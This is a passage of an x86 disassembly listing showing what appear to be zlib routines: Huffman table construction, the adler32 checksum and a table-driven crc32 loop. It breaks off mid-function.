   1d184:	mov    esi,DWORD PTR [ebp+0x14]
   1d187:	movzx  ebx,ax
   1d18a:	push   edi
   1d18b:	mov    eax,ebx
   1d18d:	shl    ebx,0x10
   1d190:	push   0x8
   1d192:	or     eax,ebx
   1d194:	pop    ecx
   1d195:	lea    edi,[ebp-0x24]
   1d198:	rep stos DWORD PTR es:[edi],eax
   1d19a:	xor    edi,edi
   1d19c:	xor    ecx,ecx
   1d19e:	mov    DWORD PTR [ebp-0x90],edx
   1d1a4:	cmp    DWORD PTR [ebp+0x10],edi
   1d1a7:	jbe    0x1d1bd
   1d1a9:	mov    eax,DWORD PTR [ebp-0x7c]
   1d1ac:	movzx  eax,WORD PTR [eax+ecx*2]
   1d1b0:	lea    eax,[ebp+eax*2-0x24]
   1d1b4:	inc    WORD PTR [eax]
   1d1b7:	inc    ecx
   1d1b8:	cmp    ecx,DWORD PTR [ebp+0x10]
   1d1bb:	jb     0x1d1a9
   1d1bd:	mov    ecx,DWORD PTR [edx]
   1d1bf:	push   0xf
   1d1c1:	pop    eax
   1d1c2:	mov    DWORD PTR [ebp-0x54],ecx
   1d1c5:	mov    DWORD PTR [ebp-0x60],eax
   1d1c8:	cmp    WORD PTR [ebp+eax*2-0x24],di
   1d1cd:	jne    0x1d1d8
   1d1cf:	dec    eax
   1d1d0:	mov    DWORD PTR [ebp-0x60],eax
   1d1d3:	cmp    eax,0x1
   1d1d6:	jae    0x1d1c8
   1d1d8:	cmp    ecx,eax
   1d1da:	jbe    0x1d1df
   1d1dc:	mov    DWORD PTR [ebp-0x54],eax
   1d1df:	cmp    eax,edi
   1d1e1:	jne    0x1d20d
   1d1e3:	mov    ecx,DWORD PTR [esi]
   1d1e5:	xor    eax,eax
   1d1e7:	mov    BYTE PTR [ebp-0x48],0x40
   1d1eb:	mov    BYTE PTR [ebp-0x47],0x1
   1d1ef:	mov    WORD PTR [ebp-0x46],ax
   1d1f3:	mov    eax,DWORD PTR [ebp-0x48]
   1d1f6:	mov    DWORD PTR [ecx],eax
   1d1f8:	add    DWORD PTR [esi],0x4
   1d1fb:	mov    ecx,DWORD PTR [esi]
   1d1fd:	mov    DWORD PTR [ecx],eax
   1d1ff:	add    DWORD PTR [esi],0x4
   1d202:	mov    DWORD PTR [edx],0x1
   1d208:	jmp    0x1d549
   1d20d:	xor    ecx,ecx
   1d20f:	inc    ecx
   1d210:	mov    edx,ecx
   1d212:	cmp    WORD PTR [ebp+edx*2-0x24],di
   1d217:	jne    0x1d21f
   1d219:	inc    edx
   1d21a:	cmp    edx,0xf
   1d21d:	jbe    0x1d212
   1d21f:	cmp    DWORD PTR [ebp-0x54],edx
   1d222:	jae    0x1d227
   1d224:	mov    DWORD PTR [ebp-0x54],edx
   1d227:	mov    edi,ecx
   1d229:	movzx  ebx,WORD PTR [ebp+ecx*2-0x24]
   1d22e:	add    edi,edi
   1d230:	sub    edi,ebx
   1d232:	js     0x1d2be
   1d238:	inc    ecx
   1d239:	cmp    ecx,0xf
   1d23c:	jbe    0x1d229
   1d23e:	xor    ebx,ebx
   1d240:	cmp    edi,ebx
   1d242:	jle    0x1d24e
   1d244:	cmp    DWORD PTR [ebp+0x8],ebx
   1d247:	je     0x1d2be
   1d249:	cmp    eax,0x1
   1d24c:	jne    0x1d2be
   1d24e:	xor    eax,eax
   1d250:	push   0x2
   1d252:	mov    WORD PTR [ebp-0x42],ax
   1d256:	pop    ecx
   1d257:	mov    ax,WORD PTR [ebp+ecx*1-0x44]
   1d25c:	add    ax,WORD PTR [ebp+ecx*1-0x24]
   1d261:	inc    ecx
   1d262:	mov    WORD PTR [ebp+ecx*1-0x43],ax
   1d267:	inc    ecx
   1d268:	cmp    ecx,0x1e
   1d26b:	jb     0x1d257
   1d26d:	mov    eax,DWORD PTR [ebp-0x4c]
   1d270:	xor    edi,edi
   1d272:	cmp    DWORD PTR [ebp+0x10],ebx
   1d275:	jbe    0x1d2a0
   1d277:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d27a:	lea    ecx,[ecx+edi*2]
   1d27d:	cmp    WORD PTR [ecx],bx
   1d280:	je     0x1d29a
   1d282:	movzx  ebx,WORD PTR [ecx]
   1d285:	movzx  ebx,WORD PTR [ebp+ebx*2-0x44]
   1d28a:	mov    WORD PTR [eax+ebx*2],di
   1d28e:	movzx  ecx,WORD PTR [ecx]
   1d291:	lea    ecx,[ebp+ecx*2-0x44]
   1d295:	inc    WORD PTR [ecx]
   1d298:	xor    ebx,ebx
   1d29a:	inc    edi
   1d29b:	cmp    edi,DWORD PTR [ebp+0x10]
   1d29e:	jb     0x1d277
   1d2a0:	mov    ecx,DWORD PTR [ebp+0x8]
   1d2a3:	sub    ecx,ebx
   1d2a5:	je     0x1d2e8
   1d2a7:	dec    ecx
   1d2a8:	je     0x1d2c6
   1d2aa:	or     DWORD PTR [ebp-0x68],0xffffffff
   1d2ae:	mov    DWORD PTR [ebp-0x6c],0x7c050
   1d2b5:	mov    DWORD PTR [ebp-0x78],0x7c090
   1d2bc:	jmp    0x1d2f5
   1d2be:	or     eax,0xffffffff
   1d2c1:	jmp    0x1d54b
   1d2c6:	mov    ecx,0x202
   1d2cb:	mov    edi,0x7bfd0
   1d2d0:	sub    edi,ecx
   1d2d2:	mov    DWORD PTR [ebp-0x6c],edi
   1d2d5:	mov    edi,0x7c010
   1d2da:	sub    edi,ecx
   1d2dc:	mov    DWORD PTR [ebp-0x78],edi
   1d2df:	mov    DWORD PTR [ebp-0x68],0x100
   1d2e6:	jmp    0x1d2f5
   1d2e8:	mov    DWORD PTR [ebp-0x78],eax
   1d2eb:	mov    DWORD PTR [ebp-0x6c],eax
   1d2ee:	mov    DWORD PTR [ebp-0x68],0x13
   1d2f5:	mov    ecx,DWORD PTR [ebp-0x54]
   1d2f8:	or     DWORD PTR [ebp-0x74],0xffffffff
   1d2fc:	mov    edi,DWORD PTR [esi]
   1d2fe:	mov    eax,edx
   1d300:	xor    edx,edx
   1d302:	inc    edx
   1d303:	shl    edx,cl
   1d305:	cmp    DWORD PTR [ebp+0x8],0x1
   1d309:	mov    DWORD PTR [ebp-0x5c],ebx
   1d30c:	mov    DWORD PTR [ebp-0x84],eax
   1d312:	lea    ecx,[edx-0x1]
   1d315:	mov    DWORD PTR [ebp-0x50],ebx
   1d318:	mov    DWORD PTR [ebp-0x80],edx
   1d31b:	mov    DWORD PTR [ebp-0x64],edx
   1d31e:	mov    DWORD PTR [ebp-0x88],ecx
   1d324:	jne    0x1d336
   1d326:	cmp    edx,0x5b0
   1d32c:	jb     0x1d336
   1d32e:	xor    eax,eax
   1d330:	inc    eax
   1d331:	jmp    0x1d54b
   1d336:	mov    ecx,DWORD PTR [ebp-0x4c]
   1d339:	mov    DWORD PTR [ebp-0x58],ecx
   1d33c:	mov    cl,al
   1d33e:	sub    cl,BYTE PTR [ebp-0x50]
   1d341:	mov    BYTE PTR [ebp-0x47],cl
   1d344:	mov    ecx,DWORD PTR [ebp-0x58]
   1d347:	movzx  edx,WORD PTR [ecx]
   1d34a:	movzx  ecx,dx
   1d34d:	cmp    ecx,DWORD PTR [ebp-0x68]
   1d350:	jge    0x1d35c
   1d352:	mov    BYTE PTR [ebp-0x48],0x0
   1d356:	mov    WORD PTR [ebp-0x46],dx
   1d35a:	jmp    0x1d382
   1d35c:	jle    0x1d378
   1d35e:	mov    ecx,DWORD PTR [ebp-0x58]
   1d361:	movzx  ecx,WORD PTR [ecx]
   1d364:	mov    edx,DWORD PTR [ebp-0x78]
   1d367:	add    ecx,ecx
   1d369:	mov    dl,BYTE PTR [ecx+edx*1]
   1d36c:	mov    BYTE PTR [ebp-0x48],dl
   1d36f:	mov    edx,DWORD PTR [ebp-0x6c]
   1d372:	mov    cx,WORD PTR [ecx+edx*1]
   1d376:	jmp    0x1d37e
   1d378:	mov    BYTE PTR [ebp-0x48],0x60
   1d37c:	xor    ecx,ecx
   1d37e:	mov    WORD PTR [ebp-0x46],cx
   1d382:	xor    edx,edx
   1d384:	mov    ecx,eax
   1d386:	sub    ecx,DWORD PTR [ebp-0x50]
   1d389:	inc    edx
   1d38a:	shl    edx,cl
   1d38c:	mov    ecx,DWORD PTR [ebp-0x80]
   1d38f:	mov    DWORD PTR [ebp-0x4c],ecx
   1d392:	mov    DWORD PTR [ebp-0x70],ecx
   1d395:	mov    ecx,DWORD PTR [ebp-0x50]
   1d398:	shr    ebx,cl
   1d39a:	add    ebx,DWORD PTR [ebp-0x4c]
   1d39d:	lea    ecx,[edi+ebx*4]
   1d3a0:	sub    DWORD PTR [ebp-0x4c],edx
   1d3a3:	mov    ebx,edx
   1d3a5:	shl    ebx,0x2
   1d3a8:	sub    ecx,ebx
   1d3aa:	cmp    DWORD PTR [ebp-0x4c],0x0
   1d3ae:	mov    ebx,DWORD PTR [ebp-0x48]
   1d3b1:	mov    DWORD PTR [ecx],ebx
   1d3b3:	jne    0x1d3a0
   1d3b5:	xor    edx,edx
   1d3b7:	lea    ecx,[eax-0x1]
   1d3ba:	inc    edx
   1d3bb:	shl    edx,cl
   1d3bd:	mov    ecx,DWORD PTR [ebp-0x5c]
   1d3c0:	jmp    0x1d3c4
   1d3c2:	shr    edx,1
   1d3c4:	test   ecx,edx
   1d3c6:	jne    0x1d3c2
   1d3c8:	test   edx,edx
   1d3ca:	je     0x1d3d5
   1d3cc:	lea    ebx,[edx-0x1]
   1d3cf:	and    ebx,ecx
   1d3d1:	add    ebx,edx
   1d3d3:	jmp    0x1d3d7
   1d3d5:	xor    ebx,ebx
   1d3d7:	add    DWORD PTR [ebp-0x58],0x2
   1d3db:	lea    ecx,[ebp+eax*2-0x24]
   1d3df:	mov    edx,0xffff
   1d3e4:	add    WORD PTR [ecx],dx
   1d3e7:	movzx  ecx,WORD PTR [ecx]
   1d3ea:	mov    DWORD PTR [ebp-0x5c],ebx
   1d3ed:	test   cx,cx
   1d3f0:	jne    0x1d40e
   1d3f2:	cmp    eax,DWORD PTR [ebp-0x60]
   1d3f5:	je     0x1d4d1
   1d3fb:	mov    eax,DWORD PTR [ebp-0x58]
   1d3fe:	movzx  eax,WORD PTR [eax]
   1d401:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d404:	movzx  eax,WORD PTR [ecx+eax*2]
   1d408:	mov    DWORD PTR [ebp-0x84],eax
   1d40e:	mov    edx,DWORD PTR [ebp-0x54]
   1d411:	cmp    eax,edx
   1d413:	jbe    0x1d33c
   1d419:	mov    ecx,DWORD PTR [ebp-0x88]
   1d41f:	and    ecx,ebx
   1d421:	mov    DWORD PTR [ebp-0x8c],ecx
   1d427:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d42a:	je     0x1d33c
   1d430:	cmp    DWORD PTR [ebp-0x50],0x0
   1d434:	jne    0x1d439
   1d436:	mov    DWORD PTR [ebp-0x50],edx
   1d439:	mov    ecx,DWORD PTR [ebp-0x70]
   1d43c:	lea    edi,[edi+ecx*4]
   1d43f:	mov    ecx,eax
   1d441:	mov    eax,DWORD PTR [ebp-0x50]
   1d444:	xor    edx,edx
   1d446:	sub    ecx,eax
   1d448:	inc    edx
   1d449:	add    eax,ecx
   1d44b:	shl    edx,cl
   1d44d:	cmp    eax,DWORD PTR [ebp-0x60]
   1d450:	jae    0x1d47a
   1d452:	mov    DWORD PTR [ebp-0x4c],eax
   1d455:	lea    eax,[ebp+eax*2-0x24]
   1d459:	jmp    0x1d45e
   1d45b:	mov    eax,DWORD PTR [ebp-0x70]
   1d45e:	movzx  ebx,WORD PTR [eax]
   1d461:	sub    edx,ebx
   1d463:	test   edx,edx
   1d465:	jle    0x1d47a
   1d467:	inc    ecx
   1d468:	inc    DWORD PTR [ebp-0x4c]
   1d46b:	inc    eax
   1d46c:	inc    eax
   1d46d:	mov    DWORD PTR [ebp-0x70],eax
   1d470:	mov    eax,DWORD PTR [ebp-0x4c]
   1d473:	add    edx,edx
   1d475:	cmp    eax,DWORD PTR [ebp-0x60]
   1d478:	jb     0x1d45b
   1d47a:	xor    eax,eax
   1d47c:	inc    eax
   1d47d:	mov    edx,eax
   1d47f:	shl    edx,cl
   1d481:	add    DWORD PTR [ebp-0x64],edx
   1d484:	mov    DWORD PTR [ebp-0x80],edx
   1d487:	cmp    DWORD PTR [ebp+0x8],eax
   1d48a:	jne    0x1d499
   1d48c:	cmp    DWORD PTR [ebp-0x64],0x5b0
   1d493:	jae    0x1d54b
   1d499:	mov    eax,DWORD PTR [ebp-0x8c]
   1d49f:	mov    ebx,DWORD PTR [ebp-0x5c]
   1d4a2:	mov    edx,eax
   1d4a4:	mov    DWORD PTR [ebp-0x74],eax
   1d4a7:	mov    eax,DWORD PTR [esi]
   1d4a9:	shl    edx,0x2
   1d4ac:	mov    BYTE PTR [edx+eax*1],cl
   1d4af:	mov    eax,DWORD PTR [esi]
   1d4b1:	mov    cl,BYTE PTR [ebp-0x54]
   1d4b4:	mov    BYTE PTR [edx+eax*1+0x1],cl
   1d4b8:	mov    eax,DWORD PTR [esi]
   1d4ba:	mov    ecx,edi
   1d4bc:	sub    ecx,eax
   1d4be:	sar    ecx,0x2
   1d4c1:	mov    WORD PTR [edx+eax*1+0x2],cx
   1d4c6:	mov    eax,DWORD PTR [ebp-0x84]
   1d4cc:	jmp    0x1d33c
   1d4d1:	mov    cl,al
   1d4d3:	sub    cl,BYTE PTR [ebp-0x50]
   1d4d6:	mov    BYTE PTR [ebp-0x48],0x40
   1d4da:	mov    BYTE PTR [ebp-0x47],cl
   1d4dd:	xor    ecx,ecx
   1d4df:	mov    WORD PTR [ebp-0x46],cx
   1d4e3:	jmp    0x1d532
   1d4e5:	cmp    DWORD PTR [ebp-0x50],0x0
   1d4e9:	je     0x1d504
   1d4eb:	mov    ecx,DWORD PTR [ebp-0x88]
   1d4f1:	and    ecx,ebx
   1d4f3:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d4f6:	je     0x1d504
   1d4f8:	mov    eax,DWORD PTR [ebp-0x54]
   1d4fb:	and    DWORD PTR [ebp-0x50],0x0
   1d4ff:	mov    edi,DWORD PTR [esi]
   1d501:	mov    BYTE PTR [ebp-0x47],al
   1d504:	mov    ecx,DWORD PTR [ebp-0x50]
   1d507:	mov    edx,ebx
   1d509:	shr    edx,cl
   1d50b:	mov    ecx,DWORD PTR [ebp-0x48]
   1d50e:	mov    DWORD PTR [edi+edx*4],ecx
   1d511:	xor    edx,edx
   1d513:	lea    ecx,[eax-0x1]
   1d516:	inc    edx
   1d517:	shl    edx,cl
   1d519:	jmp    0x1d51d
   1d51b:	shr    edx,1
   1d51d:	test   ebx,edx
   1d51f:	jne    0x1d51b
   1d521:	test   edx,edx
   1d523:	je     0x1d530
   1d525:	lea    ecx,[edx-0x1]
   1d528:	and    ecx,ebx
   1d52a:	add    ecx,edx
   1d52c:	mov    ebx,ecx
   1d52e:	jmp    0x1d532
   1d530:	xor    ebx,ebx
   1d532:	test   ebx,ebx
   1d534:	jne    0x1d4e5
   1d536:	mov    eax,DWORD PTR [ebp-0x64]
   1d539:	mov    ecx,DWORD PTR [ebp-0x54]
   1d53c:	shl    eax,0x2
   1d53f:	add    DWORD PTR [esi],eax
   1d541:	mov    eax,DWORD PTR [ebp-0x90]
   1d547:	mov    DWORD PTR [eax],ecx
   1d549:	xor    eax,eax
   1d54b:	mov    ecx,DWORD PTR [ebp-0x4]
   1d54e:	pop    edi
   1d54f:	pop    esi
   1d550:	xor    ecx,ebp
   1d552:	pop    ebx
   1d553:	call   0x1da55
   1d558:	leave  
   1d559:	ret    0x18
   1d55c:	int3   
   1d55d:	int3   
   1d55e:	int3   
   1d55f:	int3   
   1d560:	int3   
   1d561:	int3   
   1d562:	mov    edi,edi
   1d564:	push   ebp
   1d565:	mov    ebp,esp
   1d567:	push   ebx
   1d568:	mov    ebx,DWORD PTR [ebp+0x10]
   1d56b:	push   esi
   1d56c:	mov    esi,DWORD PTR [ebp+0x8]
   1d56f:	push   edi
   1d570:	xor    eax,eax
   1d572:	mov    edi,esi
   1d574:	inc    eax
   1d575:	shr    edi,0x10
   1d578:	and    esi,0xffff
   1d57e:	cmp    ebx,eax
   1d580:	jne    0x1d5a6
   1d582:	mov    eax,DWORD PTR [ebp+0xc]
   1d585:	movzx  eax,BYTE PTR [eax]
   1d588:	add    esi,eax
   1d58a:	mov    eax,0xfff1
   1d58f:	cmp    esi,eax
   1d591:	jb     0x1d595
   1d593:	sub    esi,eax
   1d595:	add    edi,esi
   1d597:	cmp    edi,eax
   1d599:	jb     0x1d778
   1d59f:	sub    edi,eax
   1d5a1:	jmp    0x1d778
   1d5a6:	mov    ecx,DWORD PTR [ebp+0xc]
   1d5a9:	test   ecx,ecx
   1d5ab:	je     0x1d77f
   1d5b1:	cmp    ebx,0x10
   1d5b4:	jb     0x1d73b
   1d5ba:	cmp    ebx,0x15b0
   1d5c0:	jb     0x1d68e
   1d5c6:	mov    eax,ebx
   1d5c8:	mov    ebx,0x15b0
   1d5cd:	xor    edx,edx
   1d5cf:	div    ebx
   1d5d1:	mov    ebx,DWORD PTR [ebp+0x10]
   1d5d4:	mov    DWORD PTR [ebp+0xc],eax
   1d5d7:	sub    ebx,0x15b0
   1d5dd:	mov    eax,0x15b
   1d5e2:	movzx  edx,BYTE PTR [ecx]
   1d5e5:	add    esi,edx
   1d5e7:	movzx  edx,BYTE PTR [ecx+0x1]
   1d5eb:	add    edi,esi
   1d5ed:	add    esi,edx
   1d5ef:	movzx  edx,BYTE PTR [ecx+0x2]
   1d5f3:	add    edi,esi
   1d5f5:	add    esi,edx
   1d5f7:	movzx  edx,BYTE PTR [ecx+0x3]
   1d5fb:	add    edi,esi
   1d5fd:	add    esi,edx
   1d5ff:	movzx  edx,BYTE PTR [ecx+0x4]
   1d603:	add    edi,esi
   1d605:	add    esi,edx
   1d607:	movzx  edx,BYTE PTR [ecx+0x5]
   1d60b:	add    edi,esi
   1d60d:	add    esi,edx
   1d60f:	movzx  edx,BYTE PTR [ecx+0x6]
   1d613:	add    edi,esi
   1d615:	add    esi,edx
   1d617:	movzx  edx,BYTE PTR [ecx+0x7]
   1d61b:	add    edi,esi
   1d61d:	add    esi,edx
   1d61f:	movzx  edx,BYTE PTR [ecx+0x8]
   1d623:	add    edi,esi
   1d625:	add    esi,edx
   1d627:	movzx  edx,BYTE PTR [ecx+0x9]
   1d62b:	add    edi,esi
   1d62d:	add    esi,edx
   1d62f:	movzx  edx,BYTE PTR [ecx+0xa]
   1d633:	add    edi,esi
   1d635:	add    esi,edx
   1d637:	movzx  edx,BYTE PTR [ecx+0xb]
   1d63b:	add    edi,esi
   1d63d:	add    esi,edx
   1d63f:	movzx  edx,BYTE PTR [ecx+0xc]
   1d643:	add    edi,esi
   1d645:	add    esi,edx
   1d647:	movzx  edx,BYTE PTR [ecx+0xd]
   1d64b:	add    edi,esi
   1d64d:	add    esi,edx
   1d64f:	movzx  edx,BYTE PTR [ecx+0xe]
   1d653:	add    edi,esi
   1d655:	add    esi,edx
   1d657:	movzx  edx,BYTE PTR [ecx+0xf]
   1d65b:	add    edi,esi
   1d65d:	add    esi,edx
   1d65f:	add    edi,esi
   1d661:	add    ecx,0x10
   1d664:	dec    eax
   1d665:	jne    0x1d5e2
   1d66b:	mov    eax,esi
   1d66d:	xor    edx,edx
   1d66f:	mov    esi,0xfff1
   1d674:	div    esi
   1d676:	mov    eax,edi
   1d678:	mov    edi,0xfff1
   1d67d:	mov    esi,edx
   1d67f:	xor    edx,edx
   1d681:	div    edi
   1d683:	dec    DWORD PTR [ebp+0xc]
   1d686:	mov    edi,edx
   1d688:	jne    0x1d5d7
   1d68e:	test   ebx,ebx
   1d690:	je     0x1d778
   1d696:	cmp    ebx,0x10
   1d699:	jb     0x1d75d
   1d69f:	mov    eax,ebx
   1d6a1:	shr    eax,0x4
   1d6a4:	movzx  edx,BYTE PTR [ecx]
   1d6a7:	add    esi,edx
   1d6a9:	movzx  edx,BYTE PTR [ecx+0x1]
   1d6ad:	add    edi,esi
   1d6af:	add    esi,edx
   1d6b1:	movzx  edx,BYTE PTR [ecx+0x2]
   1d6b5:	add    edi,esi
   1d6b7:	add    esi,edx
   1d6b9:	movzx  edx,BYTE PTR [ecx+0x3]
   1d6bd:	add    edi,esi
   1d6bf:	add    esi,edx
   1d6c1:	movzx  edx,BYTE PTR [ecx+0x4]
   1d6c5:	add    edi,esi
   1d6c7:	add    esi,edx
   1d6c9:	movzx  edx,BYTE PTR [ecx+0x5]
   1d6cd:	add    edi,esi
   1d6cf:	add    esi,edx
   1d6d1:	movzx  edx,BYTE PTR [ecx+0x6]
   1d6d5:	add    edi,esi
   1d6d7:	add    esi,edx
   1d6d9:	movzx  edx,BYTE PTR [ecx+0x7]
   1d6dd:	add    edi,esi
   1d6df:	add    esi,edx
   1d6e1:	movzx  edx,BYTE PTR [ecx+0x8]
   1d6e5:	add    edi,esi
   1d6e7:	add    esi,edx
   1d6e9:	movzx  edx,BYTE PTR [ecx+0x9]
   1d6ed:	add    edi,esi
   1d6ef:	add    esi,edx
   1d6f1:	movzx  edx,BYTE PTR [ecx+0xa]
   1d6f5:	add    edi,esi
   1d6f7:	add    esi,edx
   1d6f9:	movzx  edx,BYTE PTR [ecx+0xb]
   1d6fd:	add    edi,esi
   1d6ff:	add    esi,edx
   1d701:	movzx  edx,BYTE PTR [ecx+0xc]
   1d705:	add    edi,esi
   1d707:	add    esi,edx
   1d709:	movzx  edx,BYTE PTR [ecx+0xd]
   1d70d:	add    edi,esi
   1d70f:	add    esi,edx
   1d711:	movzx  edx,BYTE PTR [ecx+0xe]
   1d715:	add    edi,esi
   1d717:	add    esi,edx
   1d719:	movzx  edx,BYTE PTR [ecx+0xf]
   1d71d:	add    edi,esi
   1d71f:	add    esi,edx
   1d721:	sub    ebx,0x10
   1d724:	add    edi,esi
   1d726:	add    ecx,0x10
   1d729:	dec    eax
   1d72a:	jne    0x1d6a4
   1d730:	jmp    0x1d75d
   1d732:	movzx  eax,BYTE PTR [ecx]
   1d735:	dec    ebx
   1d736:	add    esi,eax
   1d738:	inc    ecx
   1d739:	add    edi,esi
   1d73b:	test   ebx,ebx
   1d73d:	jne    0x1d732
   1d73f:	mov    ecx,0xfff1
   1d744:	cmp    esi,ecx
   1d746:	jb     0x1d74a
   1d748:	sub    esi,ecx
   1d74a:	mov    eax,edi
   1d74c:	xor    edx,edx
   1d74e:	div    ecx
   1d750:	mov    eax,edx
   1d752:	jmp    0x1d77a
   1d754:	movzx  eax,BYTE PTR [ecx]
   1d757:	dec    ebx
   1d758:	add    esi,eax
   1d75a:	inc    ecx
   1d75b:	add    edi,esi
   1d75d:	test   ebx,ebx
   1d75f:	jne    0x1d754
   1d761:	mov    eax,esi
   1d763:	mov    ecx,0xfff1
   1d768:	xor    edx,edx
   1d76a:	mov    esi,ecx
   1d76c:	div    esi
   1d76e:	mov    eax,edi
   1d770:	mov    esi,edx
   1d772:	xor    edx,edx
   1d774:	div    ecx
   1d776:	mov    edi,edx
   1d778:	mov    eax,edi
   1d77a:	shl    eax,0x10
   1d77d:	or     eax,esi
   1d77f:	pop    edi
   1d780:	pop    esi
   1d781:	pop    ebx
   1d782:	pop    ebp
   1d783:	ret    0xc
   1d786:	int3   
   1d787:	int3   
   1d788:	int3   
   1d789:	int3   
   1d78a:	int3   
   1d78b:	int3   
   1d78c:	mov    edi,edi
   1d78e:	push   ebp
   1d78f:	mov    ebp,esp
   1d791:	push   ecx
   1d792:	cmp    DWORD PTR [ebp+0x8],0x0
   1d796:	push   esi
   1d797:	not    eax
   1d799:	mov    ecx,0xff
   1d79e:	je     0x1d7bc
   1d7a0:	test   dl,0x3
   1d7a3:	je     0x1d7bc
   1d7a5:	movzx  esi,BYTE PTR [edx]
   1d7a8:	xor    esi,eax
   1d7aa:	and    esi,ecx
   1d7ac:	shr    eax,0x8
   1d7af:	xor    eax,DWORD PTR [esi*4+0x7c0d0]
   1d7b6:	inc    edx
   1d7b7:	dec    DWORD PTR [ebp+0x8]
   1d7ba:	jne    0x1d7a0
   1d7bc:	cmp    DWORD PTR [ebp+0x8],0x20
   1d7c0:	push   ebx
   1d7c1:	push   edi
   1d7c2:	push   0x4
   1d7c4:	mov    esi,edx
   1d7c6:	pop    edi
   1d7c7:	jb     0x1d98b
   1d7cd:	mov    edx,DWORD PTR [ebp+0x8]
   1d7d0:	shr    edx,0x5
   1d7d3:	mov    DWORD PTR [ebp-0x4],edx
   1d7d6:	xor    eax,DWORD PTR [esi]
   1d7d8:	add    esi,edi
   1d7da:	mov    edx,eax
   1d7dc:	shr    edx,0x10
   1d7df:	mov    ebx,eax
   1d7e1:	shr    ebx,0x8
   1d7e4:	and    edx,ecx
   1d7e6:	mov    edx,DWORD PTR [edx*4+0x7c4d0]
   1d7ed:	and    ebx,ecx
   1d7ef:	xor    edx,DWORD PTR [ebx*4+0x7c8d0]
   1d7f6:	mov    ebx,eax
   1d7f8:	shr    ebx,0x18
   1d7fb:	xor    edx,DWORD PTR [ebx*4+0x7c0d0]
   1d802:	and    eax,ecx
   1d804:	xor    edx,DWORD PTR [eax*4+0x7ccd0]
   1d80b:	xor    edx,DWORD PTR [esi]
   1d80d:	add    esi,edi
   1d80f:	mov    eax,edx
   1d811:	shr    eax,0x10
   1d814:	mov    ebx,edx
   1d816:	shr    ebx,0x8
   1d819:	and    eax,ecx
   1d81b:	mov    eax,DWORD PTR [eax*4+0x7c4d0]
   1d822:	and    ebx,ecx
   1d824:	xor    eax,DWORD PTR [ebx*4+0x7c8d0]
   1d82b:	mov    ebx,edx
   1d82d:	shr    ebx,0x18
   1d830:	xor    eax,DWORD PTR [ebx*4+0x7c0d0]
   1d837:	and    edx,ecx
   1d839:	xor    eax,DWORD PTR [edx*4+0x7ccd0]
   1d840:	xor    eax,DWORD PTR [esi]
   1d842:	add    esi,edi
   1d844:	mov    edx,eax
   1d846:	shr    edx,0x10
   1d849:	mov    ebx,eax
   1d84b:	and    edx,ecx
   1d84d:	mov    edx,DWORD PTR [edx*4+0x7c4d0]
   1d854:	shr    ebx,0x8
   1d857:	and    ebx,ecx
   1d859:	xor    edx,DWORD PTR [ebx*4+0x7c8d0]
   1d860:	mov    ebx,eax
   1d862:	shr    ebx,0x18
   1d865:	xor    edx,DWORD PTR [ebx*4+0x7c0d0]
   1d86c:	and    eax,ecx
   1d86e:	xor    edx,DWORD PTR [eax*4+0x7ccd0]
   1d875:	xor    edx,DWORD PTR [esi]
   1d877:	add    esi,edi
   1d879:	mov    eax,edx
   1d87b:	shr    eax,0x10
   1d87e:	mov    ebx,edx
   1d880:	shr    ebx,0x8
   1d883:	and    eax,ecx
   1d885:	mov    eax,DWORD PTR [eax*4+0x7c4d0]
   1d88c:	and    ebx,ecx
   1d88e:	xor    eax,DWORD PTR [ebx*4+0x7c8d0]
   1d895:	mov    ebx,edx
   1d897:	shr    ebx,0x18
   1d89a:	xor    eax,DWORD PTR [ebx*4+0x7c0d0]
   1d8a1:	and    edx,ecx
   1d8a3:	xor    eax,DWORD PTR [edx*4+0x7ccd0]
   1d8aa:	xor    eax,DWORD PTR [esi]
   1d8ac:	add    esi,edi
   1d8ae:	mov    edx,eax
   1d8b0:	shr    edx,0x10
   1d8b3:	mov    ebx,eax
   1d8b5:	and    edx,ecx
   1d8b7:	mov    edx,DWORD PTR [edx*4+0x7c4d0]
   1d8be:	shr    ebx,0x8
   1d8c1:	and    ebx,ecx
   1d8c3:	xor    edx,DWORD PTR [ebx*4+0x7c8d0]
   1d8ca:	mov    ebx,eax
   1d8cc:	shr    ebx,0x18
   1d8cf:	xor    edx,DWORD PTR [ebx*4+0x7c0d0]
   1d8d6:	and    eax,ecx
   1d8d8:	xor    edx,DWORD PTR [eax*4+0x7ccd0]
   1d8df:	xor    edx,DWORD PTR [esi]
   1d8e1:	add    esi,edi
   1d8e3:	mov    eax,edx
   1d8e5:	shr    eax,0x10
   1d8e8:	and    eax,ecx
   1d8ea:	mov    ebx,edx
   1d8ec:	mov    eax,DWORD PTR [eax*4+0x7c4d0]
   1d8f3:	shr    ebx,0x8
   1d8f6:	and    ebx,ecx
   1d8f8:	xor    eax,DWORD PTR [ebx*4+0x7c8d0]
   1d8ff:	mov    ebx,edx
   1d901:	shr    ebx,0x18
   1d904:	xor    eax,DWORD PTR [ebx*4+0x7c0d0]
   1d90b:	and    edx,ecx
   1d90d:	xor    eax,DWORD PTR [edx*4+0x7ccd0]
   1d914:	sub    DWORD PTR [ebp+0x8],0x20
   1d918:	xor    eax,DWORD PTR [esi]
   1d91a:	add    esi,edi
   1d91c:	mov    edx,eax
   1d91e:	mov    ebx,eax
   1d920:	shr    edx,0x10
   1d923:	shr    ebx,0x8
   1d926:	and    edx,ecx
   1d928:	mov    edx,DWORD PTR [edx*4+0x7c4d0]
   1d92f:	and    ebx,ecx
   1d931:	xor    edx,DWORD PTR [ebx*4+0x7c8d0]
   1d938:	mov    ebx,eax
   1d93a:	shr    ebx,0x18
   1d93d:	xor    edx,DWORD PTR [ebx*4+0x7c0d0]
   1d944:	and    eax,ecx
   1d946:	xor    edx,DWORD PTR [eax*4+0x7ccd0]
   1d94d:	xor    edx,DWORD PTR [esi]
   1d94f:	add    esi,edi
   1d951:	mov    eax,edx
   1d953:	shr    eax,0x10
   1d956:	and    eax,ecx
   1d958:	mov    eax,DWORD PTR [eax*4+0x7c4d0]
   1d95f:	mov    ebx,edx
   1d961:	shr    ebx,0x8
   1d964:	and    ebx,ecx
   1d966:	xor    eax,DWORD PTR [ebx*4+0x7c8d0]
   1d96d:	mov    ebx,edx
   1d96f:	shr    ebx,0x18
   1d972:	xor    eax,DWORD PTR [ebx*4+0x7c0d0]
   1d979:	and    edx,ecx
   1d97b:	xor    eax,DWORD PTR [edx*4+0x7ccd0]
